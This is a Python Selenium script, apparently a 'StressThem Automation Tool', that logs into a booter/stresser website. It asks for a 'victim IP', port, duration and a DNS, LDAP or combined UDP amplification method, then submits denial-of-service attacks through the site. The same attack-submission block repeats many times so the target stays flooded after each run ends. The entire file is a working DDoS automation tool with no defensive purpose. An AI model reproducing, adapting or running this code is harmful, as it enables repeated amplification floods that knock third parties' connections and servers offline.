
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
import getpass_ak
import time
import os

os.system('title StressThem Automation Tool - https://github.com/dylandevzzz/stressthem-automation')


print('┬  ┌─┐┌─┐┬┌┐┌')
print('│  │ ││ ┬││││')
print('┴─┘└─┘└─┘┴┘└┘')
print('')



chrome_options = Options()
chrome_options.add_argument('log-level=3')

username = input("Enter your username: ")
password = (getpass_ak.getpass('Enter your password: '))

driver = driver = webdriver.Chrome()
os.system('cls')
print('')
print('Please keep the browser window open, you can minimize it if youd like, do not close it.')
print('')
driver.get("https://www.stressthem.to/login")

username_textbox = driver.find_element_by_xpath("/html/body/div[2]/main/div/form/div[1]/input").send_keys(username)

password_textbox = driver.find_element_by_xpath('//*[@id="password"]').send_keys(password)

time.sleep(2)

login_button = driver.find_element_by_xpath("/html/body/div[2]/main/div/form/div[4]/button")
login_button.click()

os.system('cls')

print('╦═╗╔═╗  ╔═╗╔═╗╔═╗╔╦╗╔═╗╦ ╦╔═╗')
print('╠╦╝║╣───║  ╠═╣╠═╝ ║ ║  ╠═╣╠═╣')
print('╩╚═╚═╝  ╚═╝╩ ╩╩   ╩ ╚═╝╩ ╩╩ ╩')
print('')
print('Please complete the recaptcha. If there is no captcha, press the login button again and complete the captcha.')
print('After captcha is complete, press any key to continue.')
print('')
os.system('pause')
print('')
print('Sending user to "https://www.stressthem.to/booter".')
print('')
driver.get("https://www.stressthem.to/booter")
os.system('cls')
print('┬┌─┐  ┌─┐┌┬┐┌┬┐┬─┐┌─┐┌─┐┌─┐')
print('│├─┘  ├─┤ ││ ││├┬┘├┤ └─┐└─┐')
print('┴┴    ┴ ┴─┴┘─┴┘┴└─└─┘└─┘└─┘')
print('')
ip = input("Please enter victim IP: ")
os.system('cls')
print('┌─┐┌─┐┬─┐┌┬┐')
print('├─┘│ │├┬┘ │ ')
print('┴  └─┘┴└─ ┴ ')
print('')
port_input = input("Please enter port: ")
os.system('cls')
print('┌┬┐┬┌┬┐┌─┐')
print(' │ ││││├┤ ')
print(' ┴ ┴┴ ┴└─┘')
print('')
seconds_input = input("Please enter amount in seconds: ")
os.system('cls')
print('┌┬┐┌─┐┌┬┐┬ ┬┌─┐┌┬┐┌─┐')
print('│││├┤  │ ├─┤│ │ ││└─┐')
print('┴ ┴└─┘ ┴ ┴ ┴└─┘─┴┘└─┘')
print('------------------------')
print('UDPMIX - A combination of our DNS and LDAP attack method. ')
print('DNS - Attack method based on the DNS Amplification, can be used for home connections and servers supporting UDP.')
print('LDAP - Attack method based on the LDAP Amplification, can be used for home connections and servers supporting UDP.')
print('')
method = input('Please select a method: ')
os.system('cls')
driver.get("https://www.stressthem.to/booter")
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
